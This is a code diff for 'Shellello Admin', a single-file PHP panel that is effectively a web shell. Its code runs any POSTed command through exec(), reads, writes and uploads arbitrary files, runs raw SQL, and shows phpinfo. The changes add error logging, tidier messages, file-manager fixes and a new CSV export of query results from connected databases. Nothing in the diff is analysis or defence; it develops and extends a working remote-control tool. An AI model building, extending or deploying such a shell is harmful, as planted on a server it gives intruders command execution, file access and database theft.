@@ -14,12 +14,15 @@
 session_start();
 error_reporting(E_ALL);
 ini_set('display_errors', 0);
+ini_set('log_errors', 1);
+ini_set('error_log', sys_get_temp_dir() . '/shellello_errors.log');
 
 // ==========================================
 // CONFIGURATION
 // ==========================================
 define('APP_NAME', 'Shellello Admin');
 define('APP_VERSION', '2.4.0');
+define('DEBUG_MODE', false); // Set to true only during development
 
 // SHA-256 hash of your password
 // Generate with: echo -n "yourpassword" | sha256sum
@@ -63,6 +66,29 @@ function getSessionTime() {
  * Shellello - Module 03: Helper Functions
  */
 
+function logError($context, $error) {
+    $timestamp = date('Y-m-d H:i:s');
+    $message = "[{$timestamp}] {$context}: " . $error->getMessage();
+    if (defined('DEBUG_MODE') && DEBUG_MODE) {
+        $message .= "\nStack trace: " . $error->getTraceAsString();
+    }
+    error_log($message);
+}
+
+function sanitizeErrorMessage($error) {
+    if (defined('DEBUG_MODE') && DEBUG_MODE) {
+        return $error->getMessage();
+    }
+    // Generic messages for production
+    if ($error instanceof PDOException) {
+        return 'Database operation failed';
+    }
+    if (strpos($error->getMessage(), 'file') !== false || strpos($error->getMessage(), 'directory') !== false) {
+        return 'File operation failed';
+    }
+    return 'Operation failed';
+}
+
 function formatBytes($bytes) {
     if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
     if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
@@ -72,8 +98,13 @@ function formatBytes($bytes) {
 
 function getFileList($dir) {
     $files = [];
-    if (is_dir($dir) && is_readable($dir)) {
-        foreach (scandir($dir) as $item) {
+    if (!is_dir($dir) || !is_readable($dir)) {
+        return $files;
+    }
+    try {
+        $items = @scandir($dir);
+        if ($items === false) return $files;
+        foreach ($items as $item) {
             if ($item === '.') continue;
             $path = $dir . DIRECTORY_SEPARATOR . $item;
             $isDir = is_dir($path);
@@ -93,6 +124,8 @@ function getFileList($dir) {
             if ($a['type'] === $b['type']) return strcasecmp($a['name'], $b['name']);
             return $a['type'] === 'dir' ? -1 : 1;
         });
+    } catch (Exception $e) {
+        logError('getFileList', $e);
     }
     return $files;
 }
@@ -124,19 +157,31 @@ function handleApiAction($action) {
 
             case 'read_file':
                 $path = $_GET['path'] ?? '';
-                if (file_exists($path) && is_file($path) && is_readable($path)) {
-                    $response = ['status' => 'success', 'content' => file_get_contents($path)];
-                } else {
-                    $response = ['status' => 'error', 'message' => 'File not found or not readable'];
+                try {
+                    if (!$path) throw new Exception('No path specified');
+                    if (!file_exists($path)) throw new Exception('File not found');
+                    if (!is_file($path)) throw new Exception('Not a file');
+                    if (!is_readable($path)) throw new Exception('File not readable');
+                    $content = @file_get_contents($path);
+                    if ($content === false) throw new Exception('Failed to read file');
+                    $response = ['status' => 'success', 'content' => $content];
+                } catch (Exception $e) {
+                    logError('read_file', $e);
+                    $response = ['status' => 'error', 'message' => 'Cannot read file'];
                 }
                 break;
 
             case 'save_file':
-                $path = $_POST['path'] ?? '';
+                $path = $_GET['path'] ?? $_POST['path'] ?? '';
                 $content = $_POST['content'] ?? '';
-                if ($path && file_put_contents($path, $content) !== false) {
+                try {
+                    if (!$path) throw new Exception('No path specified');
+                    if (@file_put_contents($path, $content) === false) {
+                        throw new Exception('Write failed');
+                    }
                     $response = ['status' => 'success', 'message' => 'File saved successfully'];
-                } else {
+                } catch (Exception $e) {
+                    logError('save_file', $e);
                     $response = ['status' => 'error', 'message' => 'Failed to save file'];
                 }
                 break;
@@ -210,15 +255,21 @@ function handleApiAction($action) {
 
             case 'upload_file':
                 $path = $_POST['path'] ?? getcwd();
-                if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
-                    $target = rtrim($path, '/') . '/' . basename($_FILES['file']['name']);
-                    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
-                        $response = ['status' => 'success', 'message' => 'File uploaded'];
-                    } else {
-                        $response = ['status' => 'error', 'message' => 'Upload failed'];
+                try {
+                    if (!isset($_FILES['file'])) throw new Exception('No file uploaded');
+                    $error = $_FILES['file']['error'];
+                    if ($error !== UPLOAD_ERR_OK) {
+                        $errors = [UPLOAD_ERR_INI_SIZE => 'File too large', UPLOAD_ERR_PARTIAL => 'Upload incomplete', UPLOAD_ERR_NO_FILE => 'No file uploaded'];
+                        throw new Exception($errors[$error] ?? 'Upload error');
                     }
-                } else {
-                    $response = ['status' => 'error', 'message' => 'No file uploaded'];
+                    $target = rtrim($path, '/') . '/' . basename($_FILES['file']['name']);
+                    if (!@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+                        throw new Exception('Failed to move uploaded file');
+                    }
+                    $response = ['status' => 'success', 'message' => 'File uploaded'];
+                } catch (Exception $e) {
+                    logError('upload_file', $e);
+                    $response = ['status' => 'error', 'message' => $e->getMessage()];
                 }
                 break;
 
@@ -238,21 +289,23 @@ function handleApiAction($action) {
             case 'exec_cmd':
                 $cmd = $_POST['cmd'] ?? '';
                 $cwd = $_POST['cwd'] ?? getcwd();
-                if (!empty($cmd)) {
+                try {
+                    if (empty($cmd)) throw new Exception('No command provided');
                     $output = [];
                     $oldCwd = getcwd();
-                    if (is_dir($cwd)) chdir($cwd);
-                    exec($cmd . " 2>&1", $output, $exitCode);
+                    if (is_dir($cwd)) @chdir($cwd);
+                    @exec($cmd . " 2>&1", $output, $exitCode);
                     $newCwd = getcwd();
-                    chdir($oldCwd);
+                    @chdir($oldCwd);
                     $response = [
                         'status' => 'success',
-                        'output' => implode("\n", $output),
+                        'output' => implode("\n", array_map('htmlspecialchars', $output)),
                         'exit_code' => $exitCode,
                         'cwd' => $newCwd
                     ];
-                } else {
-                    $response = ['status' => 'error', 'message' => 'No command provided'];
+                } catch (Exception $e) {
+                    logError('exec_cmd', $e);
+                    $response = ['status' => 'error', 'message' => 'Command execution failed'];
                 }
                 break;
 
@@ -279,7 +332,8 @@ function handleApiAction($action) {
                     
                     $response = ['status' => 'success', 'message' => 'Connected!', 'databases' => $databases];
                 } catch (PDOException $e) {
-                    $response = ['status' => 'error', 'message' => 'Connection failed: ' . $e->getMessage()];
+                    logError('db_connect', $e);
+                    $response = ['status' => 'error', 'message' => 'Connection failed. Check credentials.'];
                 }
                 break;
 
@@ -298,7 +352,8 @@ function handleApiAction($action) {
                     }
                     $response = ['status' => 'success', 'tables' => $tables];
                 } catch (PDOException $e) {
-                    $response = ['status' => 'error', 'message' => $e->getMessage()];
+                    logError('db_tables', $e);
+                    $response = ['status' => 'error', 'message' => 'Failed to retrieve tables'];
                 }
                 break;
 
@@ -320,7 +375,8 @@ function handleApiAction($action) {
                         $response = ['status' => 'success', 'message' => 'Query executed', 'affected' => $stmt->rowCount()];
                     }
                 } catch (PDOException $e) {
-                    $response = ['status' => 'error', 'message' => $e->getMessage()];
+                    logError('db_query', $e);
+                    $response = ['status' => 'error', 'message' => 'Query failed. Check syntax.'];
                 }
                 break;
 
@@ -329,12 +385,45 @@ function handleApiAction($action) {
                 $response = ['status' => 'success', 'message' => 'Disconnected'];
                 break;
 
+            case 'db_export_csv':
+                if (!isset($_SESSION['db'])) {
+                    $response = ['status' => 'error', 'message' => 'Not connected'];
+                    break;
+                }
+                $sql = $_POST['sql'] ?? '';
+                try {
+                    $pdo = getDbConnection();
+                    $stmt = $pdo->query($sql);
+                    $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
+                    
+                    if (empty($data)) {
+                        $response = ['status' => 'error', 'message' => 'No data to export'];
+                        break;
+                    }
+                    
+                    header('Content-Type: text/csv; charset=utf-8');
+                    header('Content-Disposition: attachment; filename="export_' . date('Y-m-d_His') . '.csv"');
+                    
+                    $output = fopen('php://output', 'w');
+                    fputcsv($output, array_keys($data[0]));
+                    foreach ($data as $row) {
+                        fputcsv($output, $row);
+                    }
+                    fclose($output);
+                    exit;
+                } catch (PDOException $e) {
+                    logError('db_export_csv', $e);
+                    $response = ['status' => 'error', 'message' => 'Export failed'];
+                }
+                break;
+
             case 'phpinfo':
                 phpinfo();
                 exit;
         }
     } catch (Exception $e) {
-        $response = ['status' => 'error', 'message' => $e->getMessage()];
+        logError('handleApiAction', $e);
+        $response = ['status' => 'error', 'message' => sanitizeErrorMessage($e)];
     }
 
     echo json_encode($response);
@@ -825,7 +914,7 @@ function renderDashboard() {
             </div>
             <div class="info-row">
                 <span class="info-label">Your IP</span>
-                <span class="info-value"><?php echo $_SERVER['REMOTE_ADDR'] ?? 'Unknown'; ?></span>
+                <span class="info-value"><?php echo $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown'; ?></span>
             </div>
             <div class="info-row">
                 <span class="info-label">Memory Usage</span>
@@ -998,8 +1087,8 @@ function renderFileManager() {
             <button class="btn btn-secondary btn-sm" onclick="refreshFiles()">🔄</button>
         </div>
         <div class="toolbar-actions">
-            <button class="btn btn-primary btn-sm" onclick="showModal('newFileModal')">📄 New File</button>
-            <button class="btn btn-primary btn-sm" onclick="showModal('newFolderModal')">📁 New Folder</button>
+            <button class="btn btn-primary btn-sm" onclick="openNewFileModal()">📄 New File</button>
+            <button class="btn btn-primary btn-sm" onclick="openNewFolderModal()">📁 New Folder</button>
             <button class="btn btn-primary btn-sm" onclick="showModal('uploadModal')">⬆️ Upload</button>
         </div>
     </div>
@@ -1166,13 +1255,17 @@ function renderFiles(files) {
         var isDir = f.type === 'dir';
         var icon = f.name === '..' ? '⬆️' : (isDir ? '📁' : '📄');
         var cls = isDir ? 'file-name dir' : 'file-name';
-        var dbl = isDir ? 
-            'navigateTo(\'' + esc(currentPath + '/' + f.name) + '\')' : 
-            'editFile(\'' + esc(currentPath + '/' + f.name) + '\')';
+        
+        // Handle '..' separately - go up instead of navigating to '..' path
+        var fullPath = f.name === '..' ? '' : (currentPath + '/' + f.name);
+        var dbl = f.name === '..' ? 'goUp()' : (isDir ? 
+            'navigateTo(\'' + esc(fullPath) + '\')' : 
+            'editFile(\'' + esc(fullPath) + '\')');
+        
         var acts = f.name === '..' ? '' : 
-            '<button class="action-btn" onclick="event.stopPropagation();showRename(\'' + esc(currentPath + '/' + f.name) + '\',\'' + esc(f.name) + '\')">✏️</button>' +
-            (isDir ? '' : '<button class="action-btn" onclick="event.stopPropagation();download(\'' + esc(currentPath + '/' + f.name) + '\')">⬇️</button>') +
-            '<button class="action-btn danger" onclick="event.stopPropagation();showDelete(\'' + esc(currentPath + '/' + f.name) + '\',\'' + esc(f.name) + '\')">🗑️</button>';
+            '<button class="action-btn" onclick="event.stopPropagation();showRename(\'' + esc(fullPath) + '\',\'' + esc(f.name) + '\')">✏️</button>' +
+            (isDir ? '' : '<button class="action-btn" onclick="event.stopPropagation();download(\'' + esc(fullPath) + '\')">⬇️</button>') +
+            '<button class="action-btn danger" onclick="event.stopPropagation();showDelete(\'' + esc(fullPath) + '\',\'' + esc(f.name) + '\')">🗑️</button>';
         html += '<tr ondblclick="' + dbl + '">' +
             '<td><span class="file-icon">' + icon + '</span><span class="' + cls + '">' + esc(f.name) + '</span></td>' +
             '<td class="text-muted">' + f.size + '</td>' +
@@ -1187,10 +1280,21 @@ function esc(s) {
     return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
 }
 
-function navigateTo(path) { currentPath = path; loadFiles(); }
+function navigateTo(path) { 
+    currentPath = path; 
+    loadFiles(); 
+}
+
 function goUp() {
-    var parts = currentPath.split('/');
-    if (parts.length > 1) { parts.pop(); currentPath = parts.join('/') || '/'; loadFiles(); }
+    var parts = currentPath.split('/').filter(function(p) { return p !== ''; });
+    if (parts.length > 0) {
+        parts.pop();
+        currentPath = '/' + parts.join('/');
+        if (currentPath === '/') currentPath = '/';
+    } else {
+        currentPath = '/';
+    }
+    loadFiles();
 }
 function goToPath() {
     var input = document.getElementById('currentPath');
@@ -1225,6 +1329,16 @@ function saveFile() {
         });
 }
 
+function openNewFileModal() {
+    document.getElementById('newFileName').value = '';
+    showModal('newFileModal');
+}
+
+function openNewFolderModal() {
+    document.getElementById('newFolderName').value = '';
+    showModal('newFolderModal');
+}
+
 function createFile() {
     var name = document.getElementById('newFileName').value.trim();
     if (!name) { toast('Enter file name', 'error'); return; }
@@ -1235,7 +1349,11 @@ function createFile() {
         .then(function(r) { return r.json(); })
         .then(function(data) {
             toast(data.message, data.status);
-            if (data.status === 'success') { closeModal('newFileModal'); loadFiles(); }
+            if (data.status === 'success') { 
+                document.getElementById('newFileName').value = '';
+                closeModal('newFileModal'); 
+                loadFiles(); 
+            }
         });
 }
 
@@ -1249,7 +1367,11 @@ function createFolder() {
         .then(function(r) { return r.json(); })
         .then(function(data) {
             toast(data.message, data.status);
-            if (data.status === 'success') { closeModal('newFolderModal'); loadFiles(); }
+            if (data.status === 'success') { 
+                document.getElementById('newFolderName').value = '';
+                closeModal('newFolderModal'); 
+                loadFiles(); 
+            }
         });
 }
 
@@ -1305,7 +1427,12 @@ function uploadFile() {
         .then(function(r) { return r.json(); })
         .then(function(data) {
             toast(data.message, data.status);
-            if (data.status === 'success') { closeModal('uploadModal'); loadFiles(); }
+            if (data.status === 'success') { 
+                document.getElementById('uploadFile').value = '';
+                document.getElementById('uploadFileName').textContent = 'No file selected';
+                closeModal('uploadModal'); 
+                loadFiles(); 
+            }
         });
 }
 
@@ -1317,13 +1444,17 @@ function toast(msg, type) {
     if (!t) {
         t = document.createElement('div');
         t.id = 'toast';
-        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;padding:1rem 1.5rem;border-radius:8px;color:#fff;font-weight:500;z-index:9999;transition:all 0.3s;';
+        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;padding:1rem 1.5rem;border-radius:8px;color:#fff;font-weight:500;z-index:9999;transition:all 0.3s;box-shadow:0 10px 25px rgba(0,0,0,0.2);';
         document.body.appendChild(t);
     }
     t.textContent = msg;
-    t.style.background = type === 'error' ? '#ef4444' : '#22c55e';
+    t.style.background = type === 'error' ? '#ef4444' : (type === 'success' ? '#22c55e' : '#3b82f6');
     t.style.opacity = '1';
-    setTimeout(function() { t.style.opacity = '0'; }, 3000);
+    t.style.transform = 'translateY(0)';
+    setTimeout(function() { 
+        t.style.opacity = '0'; 
+        t.style.transform = 'translateY(1rem)';
+    }, type === 'error' ? 4000 : 2500);
 }
 </script>
 <?php
@@ -1507,6 +1638,7 @@ function renderDatabase() {
                     <div class="query-actions">
                         <button class="btn btn-primary" onclick="runQuery()">▶️ Execute</button>
                         <button class="btn btn-secondary" onclick="clearQuery()">🗑️ Clear</button>
+                        <button class="btn btn-success" id="exportCsvBtn" onclick="exportCsv()" style="display:none;">📥 Export CSV</button>
                         <span id="queryStatus" class="query-status"></span>
                     </div>
                 </div>
@@ -1617,8 +1749,10 @@ function runQuery() {
                     status.textContent = elapsed + 's';
                     status.style.color = '#22c55e';
                     document.getElementById('resultCount').textContent = data.count + ' rows';
+                    document.getElementById('exportCsvBtn').style.display = 'inline-block';
                 } else {
                     document.getElementById('resultsCard').style.display = 'none';
+                    document.getElementById('exportCsvBtn').style.display = 'none';
                     status.textContent = (data.affected || 0) + ' rows affected';
                     status.style.color = '#22c55e';
                 }
@@ -1657,6 +1791,28 @@ function clearQuery() {
     document.getElementById('sqlQuery').value = '';
     document.getElementById('queryStatus').textContent = '';
     document.getElementById('resultsCard').style.display = 'none';
+    document.getElementById('exportCsvBtn').style.display = 'none';
+}
+
+function exportCsv() {
+    var sql = document.getElementById('sqlQuery').value.trim();
+    if (!sql) { toast('No query to export', 'error'); return; }
+    
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = '?action=db_export_csv';
+    
+    var input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = 'sql';
+    input.value = sql;
+    form.appendChild(input);
+    
+    document.body.appendChild(form);
+    form.submit();
+    document.body.removeChild(form);
+    
+    toast('Exporting CSV...', 'success');
 }
 <?php endif; ?>
 
